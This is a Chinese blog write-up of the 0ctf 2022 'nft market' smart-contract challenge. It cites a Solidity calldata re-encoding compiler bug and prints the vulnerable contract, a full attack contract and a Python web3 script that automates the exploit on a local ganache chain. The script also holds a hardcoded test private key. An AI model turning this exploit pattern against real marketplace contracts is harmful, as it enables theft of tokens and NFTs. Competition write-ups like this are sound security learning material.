[![Fork me on GitHub](https://camo.githubusercontent.com/82b228a3648bf44fc1163ef44c62fcc60081495e/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f7265645f6161303030302e706e67)](https://github.com/hitcxy/hitcxy.github.io)
[ pikachu's Blog ](https://hitcxy.com/)
# Easy coding,easy life.
  * [   
首页 ](https://hitcxy.com/)
  * [   
归档 ](https://hitcxy.com/archives)
  * [   
分类 ](https://hitcxy.com/categories)
  * [   
标签 ](https://hitcxy.com/tags)
  * [   
关于 ](https://hitcxy.com/about)
  * [   
留言 ](https://hitcxy.com/guestbook)
  * [   
友链 ](https://hitcxy.com/links)
  * [   
搜索 ](javascript:;)


close
[![pikachu's Blog](https://hitcxy.com/2022/0ctf2022/)](https://hitcxy.com/2022/0ctf2022/)
##  0ctf 2022 nft market 
发表于 2022-09-19  | 更新于 2022-09-19  | 分类于 [ 0ctf 2022 ](https://hitcxy.com/categories/0ctf-2022/) | 阅读次数    
WordCount: 3,289字 | min2read: 20分钟
**前言**
  * 0ctf 2022 nft 题目，失败的复盘，赛中调试出来了进入 verifyCoupon 后 orderid 会变成 0，但没有继续调试后面的 orderid，233333，赛后才知道了是 solidity 8.16 版本之前的 bug
  * 主要漏洞原理参考 <https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/>
  * 具体就不分析了，别的师傅已经写的很好了，这里就只放出自己的 exp
  * 参考 <https://s3cunda.github.io/2022/09/19/0ctf-2022-NFT-Market.html>


[![](https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/0ctf2022/1.png)](https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/0ctf2022/1.png)
###  [](https://hitcxy.com/2022/0ctf2022/#Source "Source")Source  
| 
```
1  
2  
3  
4  
5  
6  
7  
8  
9  
10  
11  
12  
13  
14  
15  
16  
17  
18  
19  
20  
21  
22  
23  
24  
25  
26  
27  
28  
29  
30  
31  
32  
33  
34  
35  
36  
37  
38  
39  
40  
41  
42  
43  
44  
45  
46  
47  
48  
49  
50  
51  
52  
53  
54  
55  
56  
57  
58  
59  
60  
61  
62  
63  
64  
65  
66  
67  
68  
69  
70  
71  
72  
73  
74  
75  
76  
77  
78  
79  
80  
81  
82  
83  
84  
85  
86  
87  
88  
89  
90  
91  
92  
93  
94  
95  
96  
97  
98  
99  
100  
101  
102  
103  
104  
105  
106  
107  
108  
109  
110  
111  
112  
113  
114  
115  
116  
117  
118  
119  
120  
121  
122  
123  
124  
125  
126  
127  
128  
129  
130  
131  
132  
133  
134  
135  
136  
137  
138  
139  
140  
141  
142  
143  
144  
145  
146  
147  
148  
149  
150  
151  
152  
153  
154  
155  
156  
157  
158  
159  
160  
161  
162  
163  
164  
165  
166  
167  
168  
169  
170  
171  
172  
173  
174  
175  
176  
177  
178  
179  
180  
181  
182  
183  
184  
185  
186  
187  
188  
189  
190  
191  
192  
193  
194  
195  
196  
197  
198  

```
 | 
```
pragma solidity 0.8.15;  
  
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";  
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";  
import "@openzeppelin/contracts/access/Ownable.sol";  
  
  
contract TctfNFT is ERC721, Ownable {  
    constructor() ERC721("TctfNFT", "TNFT") {  
        _setApprovalForAll(address(this), msg.sender, true);  
    }  
  
    function mint(address to, uint256 tokenId) external onlyOwner {  
        _mint(to, tokenId);  
    }  
}  
  
contract TctfToken is ERC20 {  
    bool airdropped;  
  
    constructor() ERC20("TctfToken", "TTK") {  
        _mint(address(this), 100000000000);  
        _mint(msg.sender, 1337);  
    }  
  
    function airdrop() external {  
        require(!airdropped, "Already airdropped");  
        airdropped = true;  
        _mint(msg.sender, 5);  
    }  
}  
  
struct Order {  
    address nftAddress;  
    uint256 tokenId;  
    uint256 price;  
}  
struct Coupon {  
    uint256 orderId;  
    uint256 newprice;  
    address issuer;  
    address user;  
    bytes reason;  
}  
struct Signature {  
    uint8 v;  
    bytes32[2] rs;  
}  
struct SignedCoupon {  
    Coupon coupon;  
    Signature signature;  
}  
  
contract TctfMarket {  
    event SendFlag();  
    event NFTListed(  
        address indexed seller,  
        address indexed nftAddress,  
        uint256 indexed tokenId,  
        uint256 price  
    );  
  
    event NFTCanceled(  
        address indexed seller,  
        address indexed nftAddress,  
        uint256 indexed tokenId  
    );  
  
    event NFTBought(  
        address indexed buyer,  
        address indexed nftAddress,  
        uint256 indexed tokenId,  
        uint256 price  
    );  
  
    bool tested;  
    TctfNFT public tctfNFT;  
    TctfToken public tctfToken;  
    CouponVerifierBeta public verifier;  
    Order[] orders;  
  
    constructor() {  
        tctfToken = new TctfToken();  
        tctfToken.approve(address(this), type(uint256).max);  
  
        tctfNFT = new TctfNFT();  
        tctfNFT.mint(address(tctfNFT), 1);  
        tctfNFT.mint(address(this), 2);  
        tctfNFT.mint(address(this), 3);  
  
        verifier = new CouponVerifierBeta();  
  
        orders.push(Order(address(tctfNFT), 1, 1));  
        orders.push(Order(address(tctfNFT), 2, 1337));  
        orders.push(Order(address(tctfNFT), 3, 13333333337));  
    }  
  
    function getOrder(uint256 orderId) public view returns (Order memory order) {  
        require(orderId < orders.length, "Invalid orderId");  
        order = orders[orderId];          
    }  
  
    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {  
        require(price > 0, "Invalid price");  
        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");  
        orders.push(Order(nftAddress, tokenId, price));  
        emit NFTListed(msg.sender, nftAddress, tokenId, price);  
        return orders.length - 1;  
    }  
  
    function cancelOrder(uint256 orderId) external {  
        Order memory order = getOrder(orderId);  
        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), "Not owner");  
        _deleteOrder(orderId);  
        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);  
    }  
  
    function purchaseOrder(uint256 orderId) external {  
        Order memory order = getOrder(orderId);  
        _deleteOrder(orderId);  
        IERC721 nft = IERC721(order.nftAddress);  
        address owner = nft.ownerOf(order.tokenId);  
        tctfToken.transferFrom(msg.sender, owner, order.price);  
        nft.safeTransferFrom(owner, msg.sender, order.tokenId);  
        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);  
    }  
  
    function purchaseWithCoupon(SignedCoupon calldata scoupon) external {  
        Coupon memory coupon = scoupon.coupon;  
        require(coupon.user == msg.sender, "Invalid user");  
        require(coupon.newprice > 0, "Invalid price");  
        verifier.verifyCoupon(scoupon);  
        Order memory order = getOrder(coupon.orderId);  
        _deleteOrder(coupon.orderId);  
        IERC721 nft = IERC721(order.nftAddress);  
        address owner = nft.ownerOf(order.tokenId);  
        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);  
        nft.safeTransferFrom(owner, coupon.user, order.tokenId);  
        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);  
    }  
  
    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {  
        require(!tested, "Tested");  
        tested = true;  
        IERC721 nft = IERC721(nftAddress);  
        uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);  
        nft.approve(address(this), tokenId);  
        TctfMarket(this).purchaseOrder(orderId);  
    }  
  
    function win() external {  
        require(tctfNFT.ownerOf(1) == msg.sender && tctfNFT.ownerOf(2) == msg.sender && tctfNFT.ownerOf(3) == msg.sender);  
        emit SendFlag();  
    }  
  
    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {  
        IERC721 nft = IERC721(nftAddress);  
        address owner = nft.ownerOf(tokenId);  
        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);  
    }  
  
    function _deleteOrder(uint256 orderId) internal {  
        orders[orderId] = orders[orders.length - 1];  
        orders.pop();  
    }  
  
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {  
        return this.onERC721Received.selector;  
    }  
}  
  
contract CouponVerifierBeta {  
    TctfMarket market;  
    bool tested;  
  
    constructor() {  
        market = TctfMarket(msg.sender);  
    }  
  
    function verifyCoupon(SignedCoupon calldata scoupon) public {  
        require(!tested, "Tested");  
        tested = true;  
        Coupon memory coupon = scoupon.coupon;  
        Signature memory sig = scoupon.signature;  
        Order memory order = market.getOrder(coupon.orderId);  
        bytes memory serialized = abi.encode(  
            "I, the issuer", coupon.issuer,  
            "offer a special discount for", coupon.user,  
            "to buy", order, "at", coupon.newprice,  
            "because", coupon.reason  
        );  
        IERC721 nft = IERC721(order.nftAddress);  
        address owner = nft.ownerOf(order.tokenId);  
        require(coupon.issuer == owner, "Invalid issuer");  
        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");  
    }  
  
}  

```
 |  
| --- | --- |  
###  [](https://hitcxy.com/2022/0ctf2022/#EXP "EXP")EXP
  * attack.sol

  
| 
```
1  
2  
3  
4  
5  
6  
7  
8  
9  
10  
11  
12  
13  
14  
15  
16  
17  
18  
19  
20  
21  
22  
23  
24  
25  
26  
27  
28  
29  
30  
31  
32  
33  
34  
35  
36  
37  
38  
39  
40  
41  
42  
43  
44  
45  
46  
47  
48  
49  
50  
51  
52  
53  
54  
55  
56  
57  
58  
59  
60  
61  
62  
63  
64  
65  
66  
67  
68  
69  
70  
71  
72  
73  
74  
75  
76  
77  
78  
79  
80  
81  
82  
83  
84  
85  
86  
87  
88  
89  
90  
91  
92  
93  
94  
95  
96  
97  
98  
99  
100  
101  
102  
103  
104  
105  
106  
107  
108  
109  
110  
111  
112  
113  
114  
115  
116  
117  
118  
119  
120  
121  
122  
123  
124  
125  
126  
127  
128  
129  
130  
131  
132  
133  
134  
135  
136  
137  
138  
139  
140  
141  
142  
143  
144  
145  
146  
147  
148  
149  
150  
151  
152  
153  
154  
155  
156  
157  
158  
159  
160  
161  
162  
163  
164  
165  
166  
167  
168  
169  
170  
171  
172  
173  
174  
175  
176  
177  
178  
179  
180  
181  
182  
183  
184  
185  
186  
187  
188  
189  
190  
191  
192  
193  
194  
195  
196  
197  
198  
199  
200  
201  
202  
203  
204  
205  
206  
207  
208  
209  
210  
211  
212  
213  
214  
215  
216  
217  
218  
219  
220  
221  
222  
223  
224  
225  
226  
227  
228  
229  
230  
231  
232  
233  
234  
235  
236  
237  
238  
239  
240  
241  
242  
243  
244  
245  
246  
247  
248  
249  
250  
251  
252  
253  
254  
255  
256  
257  
258  
259  
260  
261  
262  
263  
264  
265  
266  
267  
268  
269  
270  
271  
272  
273  
274  
275  
276  
277  
278  
279  
280  
281  
282  
283  
284  
285  
286  

```
 | 
```
pragma solidity 0.8.15;  
  
import "./openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";  
import "./openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";  
import "./openzeppelin-contracts/contracts/access/Ownable.sol";  
  
contract TctfNFT is ERC721, Ownable {  
    constructor() ERC721("TctfNFT", "TNFT") {  
        _setApprovalForAll(address(this), msg.sender, true);  
    }  
  
    function mint(address to, uint256 tokenId) external onlyOwner {  
        _mint(to, tokenId);  
    }  
}  
  
contract TctfToken is ERC20 {  
    bool airdropped;  
  
    constructor() ERC20("TctfToken", "TTK") {  
        _mint(address(this), 100000000000);  
        _mint(msg.sender, 1337);  
    }  
  
    function airdrop() external {  
        require(!airdropped, "Already airdropped");  
        airdropped = true;  
        _mint(msg.sender, 5);  
    }  
}  
  
struct Order {  
    address nftAddress;  
    uint256 tokenId;  
    uint256 price;  
}  
struct Coupon {  
    uint256 orderId;  
    uint256 newprice;  
    address issuer;  
    address user;  
    bytes reason;  
}  
struct Signature {  
    uint8 v;  
    bytes32[2] rs;  
}  
struct SignedCoupon {  
    Coupon coupon;  
    Signature signature;  
}  
  
contract TctfMarket {  
    event SendFlag();  
    event NFTListed(  
        address indexed seller,  
        address indexed nftAddress,  
        uint256 indexed tokenId,  
        uint256 price  
    );  
  
    event NFTCanceled(  
        address indexed seller,  
        address indexed nftAddress,  
        uint256 indexed tokenId  
    );  
  
    event NFTBought(  
        address indexed buyer,  
        address indexed nftAddress,  
        uint256 indexed tokenId,  
        uint256 price  
    );  
  
    bool tested;  
    TctfNFT public tctfNFT;  
    TctfToken public tctfToken;  
    CouponVerifierBeta public verifier;  
    Order[] orders;  
  
    constructor() {  
        tctfToken = new TctfToken();  
        tctfToken.approve(address(this), type(uint256).max);  
  
        tctfNFT = new TctfNFT();  
        tctfNFT.mint(address(tctfNFT), 1);  
        tctfNFT.mint(address(this), 2);  
        tctfNFT.mint(address(this), 3);  
  
        verifier = new CouponVerifierBeta();  
  
        orders.push(Order(address(tctfNFT), 1, 1));  
        orders.push(Order(address(tctfNFT), 2, 1337));  
        orders.push(Order(address(tctfNFT), 3, 13333333337));  
    }  
  
    function getOrder(uint256 orderId) public view returns (Order memory order) {  
        require(orderId < orders.length, "Invalid orderId");  
        order = orders[orderId];  
    }  
  
    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {  
        require(price > 0, "Invalid price");  
        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");  
        orders.push(Order(nftAddress, tokenId, price));  
        emit NFTListed(msg.sender, nftAddress, tokenId, price);  
        return orders.length - 1;  
    }  
  
    function cancelOrder(uint256 orderId) external {  
        Order memory order = getOrder(orderId);  
        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), "Not owner");  
        _deleteOrder(orderId);  
        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);  
    }  
  
    function purchaseOrder(uint256 orderId) external {  
        Order memory order = getOrder(orderId);  
        _deleteOrder(orderId);  
        IERC721 nft = IERC721(order.nftAddress);  
        address owner = nft.ownerOf(order.tokenId);  
        tctfToken.transferFrom(msg.sender, owner, order.price);  
        nft.safeTransferFrom(owner, msg.sender, order.tokenId);  
        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);  
    }  
  
    function purchaseWithCoupon(SignedCoupon calldata scoupon) external {  
        Coupon memory coupon = scoupon.coupon;  
        require(coupon.user == msg.sender, "Invalid user");  
        require(coupon.newprice > 0, "Invalid price");  
        verifier.verifyCoupon(scoupon);  
        Order memory order = getOrder(coupon.orderId);  
        _deleteOrder(coupon.orderId);  
        IERC721 nft = IERC721(order.nftAddress);  
        address owner = nft.ownerOf(order.tokenId);  
        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);  
        nft.safeTransferFrom(owner, coupon.user, order.tokenId);  
        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);  
    }  
  
    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {  
        require(!tested, "Tested");  
        tested = true;  
        IERC721 nft = IERC721(nftAddress);  
        uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);  
        nft.approve(address(this), tokenId);  
        TctfMarket(this).purchaseOrder(orderId);  
    }  
  
    function win() external {  
        require(tctfNFT.ownerOf(1) == msg.sender && tctfNFT.ownerOf(2) == msg.sender && tctfNFT.ownerOf(3) == msg.sender);  
        emit SendFlag();  
    }  
  
    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {  
        IERC721 nft = IERC721(nftAddress);  
        address owner = nft.ownerOf(tokenId);  
        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);  
    }  
  
    function _deleteOrder(uint256 orderId) internal {  
        orders[orderId] = orders[orders.length - 1];  
        orders.pop();  
    }  
  
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {  
        return this.onERC721Received.selector;  
    }  
}  
  
contract CouponVerifierBeta {  
    TctfMarket market;  
    bool tested;  
  
    constructor() {  
        market = TctfMarket(msg.sender);  
    }  
  
    function verifyCoupon(SignedCoupon calldata scoupon) public {  
        require(!tested, "Tested");  
        tested = true;  
        Coupon memory coupon = scoupon.coupon;  
        Signature memory sig = scoupon.signature;  
        Order memory order = market.getOrder(coupon.orderId);  
        bytes memory serialized = abi.encode(  
            "I, the issuer", coupon.issuer,  
            "offer a special discount for", coupon.user,  
            "to buy", order, "at", coupon.newprice,  
            "because", coupon.reason  
        );  
        IERC721 nft = IERC721(order.nftAddress);  
        address owner = nft.ownerOf(order.tokenId);  
        require(coupon.issuer == owner, "Invalid issuer");  
        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");  
    }  
}  
  
contract AA {  
      
    address issuer;  
    address user;  
    uint256 newprice;  
    bytes reason;  
    Order order;  
    bytes32 public hashl;  
  
    function setinit(address _issuer, address _user, uint _newprice, address _nftaddress, uint _price, uint _tokenId) public {  
        issuer = _issuer;  
        user = _user;  
        newprice = _newprice;  
        order.nftAddress = _nftaddress;  
        order.price = _price;  
        order.tokenId = _tokenId;  
  
        bytes memory serialized = abi.encode(  
            "I, the issuer", issuer,  
            "offer a special discount for", user,  
            "to buy", order, "at", newprice,  
            "because", ""  
        );  
        hashl = keccak256(serialized);  
    }  
}  
  
contract Attack {  
  
    TctfMarket T = TctfMarket(0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45);  
    address account=0x80C86B253647868C927dc8442143B880203BC397;  
    TctfNFT N= TctfNFT(address(T.tctfNFT()));   
    TctfToken Token=TctfToken(T.tctfToken());  
  
    function approve(address a,uint b) public {  
          
    }  
    function safeTransferFrom(address a,address b,uint c) public {  
  
    }  
  
    function ownerOf(uint dd) public returns (address){  
  
        if(dd==2){  
            return address(this);  
        }else if(dd==3){  
            return address(account);  
        }  
          
    }  
  
    function isApprovedForAll(address a,address b) public returns (bool){  
        return true;  
    }  
  
    function getApproved(uint tokenId) public returns (address){  
        return address(this);  
    }  
    function  attack1() public {  
        T.purchaseTest(address(this),2,1337);  
        Token.transfer(account,1337);  
    }  
  
    function attackfor3(uint8 v, bytes32 r, bytes32 s) public {  
        SignedCoupon memory scoupon;  
        N.setApprovalForAll(account,true);  
        Token.approve(address(0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45),10);  
        scoupon.coupon.orderId=1;  
        scoupon.coupon.newprice=1;  
        scoupon.coupon.issuer=address(account);  
        scoupon.coupon.user=address(this);  
        scoupon.coupon.reason="";  
        scoupon.signature.v=v;  
        scoupon.signature.rs[0]=r;   
        scoupon.signature.rs[1]=s;  
        T.purchaseWithCoupon{gas:200000}(scoupon);  
          
    }  
  
    function attack4() public {  
        N.setApprovalForAll(account,true);  
        N.transferFrom(address(this),address(account),3);  
    }  
  
  
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {  
        return this.onERC721Received.selector;  
    }  
}  

```
 |  
| --- | --- |  
  * python 自动化一键运行，环境为本地 ganache 测试环境

  
| 
```
1  
2  
3  
4  
5  
6  
7  
8  
9  
10  
11  
12  
13  
14  
15  
16  
17  
18  
19  
20  
21  
22  
23  
24  
25  
26  
27  
28  
29  
30  
31  
32  
33  
34  
35  
36  
37  
38  
39  
40  
41  
42  
43  
44  
45  
46  
47  
48  
49  
50  
51  
52  
53  
54  
55  
56  
57  
58  
59  
60  
61  
62  
63  
64  
65  
66  
67  
68  
69  
70  
71  
72  
73  
74  
75  
76  
77  
78  
79  
80  
81  
82  
83  
84  
85  
86  
87  
88  
89  
90  
91  
92  
93  
94  
95  
96  
97  
98  
99  
100  
101  
102  
103  
104  
105  
106  
107  
108  
109  
110  
111  
112  
113  
114  
115  
116  
117  
118  
119  
120  
121  
122  
123  
124  
125  
126  
127  
128  
129  
130  
131  
132  
133  
134  
135  
136  
137  
138  
139  
140  
141  
142  
143  
144  
145  
146  
147  
148  
149  
150  
151  
152  
153  
154  
155  
156  
157  
158  
159  
160  
161  
162  
163  
164  
165  
166  
167  
168  
169  
170  
171  
172  
173  
174  
175  
176  
177  
178  
179  
180  
181  
182  
183  
184  
185  
186  
187  
188  
189  
190  
191  
192  
193  
194  
195  
196  
197  
198  
199  
200  
201  
202  
203  
204  
205  
206  
207  
208  
209  
210  
211  
212  
213  
214  
215  
216  
217  
218  
219  
220  
221  
222  
223  
224  
225  
226  
227  
228  
229  
230  
231  
232  
233  
234  
235  
236  
237  
238  
239  
240  
241  
242  
243  
244  
245  
246  
247  
248  

```
 | 
```
from web3 import Web3, HTTPProvider  
from solcx import compile_source,set_solc_version_pragma,compile_files  
import time  
import os  
  
w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))  
  
private = "199280a1c26810629f63269567b0aa1ee11c52bdaf16cf5526d0f4f3aadb65fb"  
public = "0x2482119eBcDb9659397A0c1c59ed948fae80d47F"  
  
_time = 1  
  
set_solc_version_pragma('^0.8.15')  
chain_id = w3.eth.chain_id  
  
def generate_tx(chainID, to, data, value):  
    txn = {  
        'chainId': chainID,  
        'from': Web3.toChecksumAddress(public),  
        'to': to,  
        'gasPrice': w3.eth.gasPrice,  
        'gas': 10000000,  
        'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)),  
        'value': Web3.toWei(value, 'ether'),  
        'data': data,  
    }  
    return txn  
  
def sign_and_send(txn):  
    signed_txn = w3.eth.account.signTransaction(txn, private)  
    txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()  
    txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)  
    print("txn_hash=", txn_hash)  
    return txn_receipt  
  
def deploy_eth():  
    compiled_sol = compile_files(["eth.sol"],output_values=["abi", "bin"],solc_version="0.8.15")  
  
    data = compiled_sol['eth.sol:TctfMarket']['bin']  
    abi = compiled_sol['eth.sol:TctfMarket']['abi']  
    abi_TctfNFT = compiled_sol['eth.sol:TctfNFT']['abi']  
    txn = generate_tx(chain_id, '', data, 0)  
    txn_receipt = sign_and_send(txn)  
    if txn_receipt['status'] == 1:  
        TctfMarket_address = txn_receipt['contractAddress']  
        return TctfMarket_address,abi,abi_TctfNFT  
    else:  
        exit(0)  
  
def copy_attack(_TctfMarket):  
    with open('attack_bk.sol', 'r') as f:  
        ff = f.read()  
        ff = ff.replace('0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45' , _TctfMarket)  
        ff = ff.replace('0x80C86B253647868C927dc8442143B880203BC397' , public)  
        with open('attack.sol', 'w') as g:  
            g.write(ff)  
  
def deploy_attack():  
    compiled_sol = compile_files(["attack.sol"],output_values=["abi", "bin"],solc_version="0.8.15")  
  
    data = compiled_sol['attack.sol:Attack']['bin']  
    txn = generate_tx(chain_id, '', data, 0)  
    txn_receipt = sign_and_send(txn)  
    if txn_receipt['status'] == 1:  
        attack_address = txn_receipt['contractAddress']  
        return attack_address  
    else:  
        exit(0)  
  
def deploy_AA():  
    compiled_sol = compile_files(["attack.sol"],output_values=["abi", "bin"],solc_version="0.8.15")  
  
    data = compiled_sol['attack.sol:AA']['bin']  
    abi = compiled_sol['attack.sol:AA']['abi']  
    txn = generate_tx(chain_id, '', data, 0)  
    txn_receipt = sign_and_send(txn)  
    if txn_receipt['status'] == 1:  
        AA_address = txn_receipt['contractAddress']  
        return AA_address,abi  
    else:  
        exit(0)  
  
def rsv(_hash):  
    signed_message = w3.eth.account.signHash(_hash, private)  
    print(signed_message.messageHash.hex())  
    r = '0x'+signed_message.signature.hex()[2:66]  
    s = '0x'+signed_message.signature.hex()[66:-2]  
    v = '0x'+signed_message.signature.hex()[-2:]  
    return r,s,v  
  
TctfMarket_address,abi,abi_TctfNFT = deploy_eth()  
print('TctfMarket_address =',TctfMarket_address)  
# TctfMarket_address = "0x1d5f96A512a946c5C2A729f8155CCBb7bbBb3f3B"  
contract = w3.eth.contract(abi = abi, address = TctfMarket_address)  
  
tctfNFT_address = contract.functions.tctfNFT().call()  
print('tctfNFT_address =',tctfNFT_address)  
tctfToken_address = contract.functions.tctfToken().call()  
print('tctfToken_address =',tctfToken_address)  
verifier_address = contract.functions.verifier().call()  
print('verifier_address =',verifier_address)  
  
TctfNFT_contract = w3.eth.contract(abi = abi_TctfNFT, address = tctfNFT_address)  
  
copy_attack(TctfMarket_address)  
  
attack_address = deploy_attack()  
print('attack_address =',attack_address)  
  
AA_address,abi = deploy_AA()  
print('AA_address =',AA_address)  
AA_contract = w3.eth.contract(abi = abi, address = AA_address)  
  
data = Web3.keccak(text='setinit(address,address,uint256,address,uint256,uint256)').hex()[:10]  
data += public[2:].rjust(64, '0')  
data += attack_address[2:].rjust(64, '0')  
data += '1'.rjust(64, '0')  
data += attack_address[2:].rjust(64, '0')  
data += '1'.rjust(64, '0')  
data += '3'.rjust(64, '0')  
txn = generate_tx(chain_id, Web3.toChecksumAddress(AA_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('setinit(eoa,attack_address,1,attack_address,1,3) success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
hashl = AA_contract.functions.hashl().call()  
r,s,v = rsv(hashl)  
print('r =',r)  
print('s =',s)  
print('v =',v)  
  
data = Web3.keccak(text='attack1()').hex()[:10]  
txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('attack1 success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
data = Web3.keccak(text='airdrop()').hex()[:10]  
txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('airdrop() success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
data = Web3.keccak(text='approve(address,uint256)').hex()[:10]  
data += TctfMarket_address[2:].rjust(64, '0')  
data += '2710'.rjust(64, '0')  
txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('approve(TctfMarket_address,10000) success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
  
  
data = Web3.keccak(text='transfer(address,uint256)').hex()[:10]  
data += attack_address[2:].rjust(64, '0')  
data += '2'.rjust(64, '0')  
txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('transfer(attack_address,2) success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
  
data = Web3.keccak(text='purchaseOrder(uint256)').hex()[:10]  
data += '1'.rjust(64, '0')  
txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('purchaseOrder(1) success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
  
data = Web3.keccak(text='createOrder(address,uint256,uint256)').hex()[:10]  
data += attack_address[2:].rjust(64, '0')  
data += '3'.rjust(64, '0')  
data += '1'.rjust(64, '0')  
txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('createOrder(attack,3,1) success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
  
data = Web3.keccak(text='purchaseOrder(uint256)').hex()[:10]  
data += '0'.rjust(64, '0')  
txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('purchaseOrder(0) success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
  
data = Web3.keccak(text='attackfor3(uint8,bytes32,bytes32)').hex()[:10]  
data += v[2:].rjust(64,'0')  
data += r[2:].rjust(64,'0')  
data += s[2:].rjust(64,'0')  
txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)  
txn_receipt = sign_and_send(txn)  
# print(txn_receipt)  
if txn_receipt['status'] == 1:  
    print('attackfor3(v,r,s) success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
data = Web3.keccak(text='attack4()').hex()[:10]  
txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)  
txn_receipt = sign_and_send(txn)  
if txn_receipt['status'] == 1:  
    print('attack4() success')  
else:  
    exit(0)  
  
time.sleep(_time)  
  
print("EOA account",public)  
print("token1 owner:",TctfNFT_contract.functions.ownerOf(1).call())  
print("token2 owner:",TctfNFT_contract.functions.ownerOf(2).call())  
print("token3 owner:",TctfNFT_contract.functions.ownerOf(3).call())  

```
 |  
| --- | --- |  
---------------- The End ----------------
谢谢大爷～
赏
[![pikachu WeChat Pay](https://hitcxy.com/images/donate/wechat.png)](https://hitcxy.com/images/donate/wechat.png)
微信打赏
[![pikachu Alipay](https://hitcxy.com/images/donate/alipay.jpg)](https://hitcxy.com/images/donate/alipay.jpg)
支付宝打赏
Author：**pikachu**  
Link：[https://hitcxy.com/2022/0ctf2022/](https://hitcxy.com/2022/0ctf2022/ "0ctf 2022 nft market")  
Contact：hitcxy.cn@gmail.com  
**本文基于[ 知识共享署名-相同方式共享 4.0 ](http://creativecommons.org/licenses/by-sa/4.0/ "Creative Commons Attribution-ShareAlike 4.0 International \(CC BY-SA 4.0\)")国际许可协议发布**  
**转载请注明出处，谢谢！**
[ 0ctf2022](https://hitcxy.com/tags/0ctf2022/) [ NFT](https://hitcxy.com/tags/NFT/)
[ qwb2022 第六届强网杯线上赛区块链 bytebyte ](https://hitcxy.com/2022/bytebyte/ "qwb2022 第六届强网杯线上赛区块链 bytebyte")
[ study ](https://hitcxy.com/2023/sstudy/ "study")
Gitalk 加载中 ...
  * 文章目录 
  * 站点概览 


![pikachu](https://hitcxy.com/images/avatar/1.jpg)
pikachu
帅 | 码渣 | 宅 | 金木粉
[ 58 日志 ](https://hitcxy.com/archives)
[ 16 分类 ](https://hitcxy.com/categories)
[ 79 标签 ](https://hitcxy.com/tags)
[ RSS ](https://hitcxy.com/atom.xml)
